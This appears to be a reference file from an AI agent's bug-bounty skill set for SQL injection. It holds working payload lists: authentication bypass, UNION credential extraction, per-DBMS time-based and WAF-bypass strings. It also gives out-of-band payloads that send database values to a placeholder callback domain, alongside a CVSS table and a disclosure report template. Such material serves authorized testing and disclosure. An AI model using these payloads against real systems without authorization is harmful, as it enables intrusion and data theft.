# Payloads, Severity, and Report Template

## Syntax/error discovery

```
'   ''   "   `
```

## Boolean

```
' OR 1=1--
' OR 1=2--
```

## UNION — column count and extraction

```
ORDER BY 1--   ORDER BY 2--   ORDER BY 3--
UNION SELECT NULL--
UNION SELECT NULL,NULL--
UNION SELECT NULL,NULL,NULL--
UNION SELECT username,password FROM users--
```

## Version discovery per DBMS

```
MySQL:       UNION SELECT @@version
PostgreSQL:  UNION SELECT version()
MSSQL:       UNION SELECT @@version
Oracle:      UNION SELECT banner FROM v$version
SQLite:      UNION SELECT sqlite_version()
```

## Time-based per DBMS

```
MySQL:       ' AND IF(1=1,SLEEP(5),0)--
PostgreSQL:  '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
MSSQL:       '; IF (1=1) WAITFOR DELAY '0:0:5'--
Oracle:      ' AND 1=(CASE WHEN (1=1) THEN dbms_pipe.receive_message(('x'),5) ELSE 1 END)--
```

## OAST per DBMS (replace YOUR-OAST-DOMAIN with your Collaborator/interactsh subdomain)

```
MSSQL:       '; EXEC master..xp_dirtree '\\'+(SELECT @@version)+'.YOUR-OAST-DOMAIN\a'--
Oracle:      SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.YOUR-OAST-DOMAIN/') FROM dual;
MySQL:       AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.YOUR-OAST-DOMAIN\\a')))
PostgreSQL:  SELECT dblink_connect('host=YOUR-OAST-DOMAIN dbname=x user=x password=x');
```

## Authentication bypass

```
administrator'--
admin' OR '1'='1
' OR 1=1--
```

## WAF-bypass quick reference

```
Inline comment for space:  /**/
Case randomization:         uNiOn SeLeCt
Hex encoding:                0x61646d696e
Operator substitution:       1 AND A>B  -->  1 AND A NOT BETWEEN 0 AND B
```

## Tools

| Tool | Use |
|---|---|
| `sqlmap` | Automated detection and exploitation across all techniques; `--tamper` for WAF evasion, `--technique=B`/`T`/`U`/`E` to force a specific method |
| Burp Suite Collaborator / `interactsh-client` | OAST callback infrastructure for out-of-band confirmation and exfiltration |
| Burp Intruder | Manual payload permutation and timing-comparison automation |

---

## CVSS 3.1 quick reference for common SQL injection findings

| Finding | Typical CVSS range | Severity |
|---|---|---|
| Authentication bypass via SQLi (any account) | ~8.1–9.1 | High–Critical |
| Authentication bypass targeting/confirmed as admin | ~9.1–9.8 | Critical |
| UNION/error-based extraction of sensitive data (PII, credentials) | ~8.1–9.1 | High–Critical |
| Boolean/time-blind extraction confirmed, sensitive data recovered | ~7.5–8.8 | High |
| OAST-confirmed injection with no further data extraction demonstrated | ~6.5–7.5 | Medium–High |
| Second-order SQLi, confirmed execution at the second operation | ~7.5–9.1 | High–Critical (often higher than first-order due to privilege-direction — see `blind-and-oast-extraction.md`) |
| SQLi escalated to RCE (xp_cmdshell, COPY PROGRAM, UDF) | ~9.1–9.8 | Critical |
| Filter/WAF bypass demonstrated with no data extraction behind it | n/a | Not yet a finding — see validation gate in `SKILL.md` |

## Full report template

```markdown
**Title**: SQL injection in [exact endpoint/parameter] allows [actor] to [impact]

## Summary
2-3 plain sentences: the endpoint/parameter, the injection technique
used, and the DBMS, plus what was actually extracted or achieved.

## Steps to Reproduce
1. Send: [exact request — method, path, headers, body]
2. Observe: [exact response, extracted data, timing comparison, or
   OAST interaction log entry demonstrating the injection]
3. [If escalated] Show the chain step that achieved the final impact
   (RCE proof, second-order trigger, etc.)

## Proof of Concept
Request/response pairs; for blind/time-based findings, include
multiple trials of both the true/delay and false/control requests;
for OAST, include the interaction log.

## Impact
An attacker can [exact action]. State precisely what was extracted —
specific table/column names, a redacted sample of real data, or a
specific command's output — not a generic "full database compromise"
claim unless you demonstrated dumping it.

## Suggested Fix
One or two sentences specific to this endpoint — e.g., "Replace the
string-concatenated query with a parameterized query / prepared
statement; do not rely on escaping functions alone."

## Severity Assessment
CVSS 3.1: X.X ([Severity label]) — see table above for basis
```

### Tone notes

- Lead with the impact and DBMS, not a SQL-injection tutorial.
- Redact actual extracted credentials/PII in the report; describe what type of data was recovered and include a minimally-identifying sample if needed for proof.
- For second-order findings, explicitly state the privilege direction (low-privilege plant → higher-privilege trigger) since it's easy for a triager to under-score this if it isn't spelled out.
- If you escalated to RCE, state plainly that you stopped at minimal proof.
- Keep it under ~600 words, consistent with the other skills in this set.
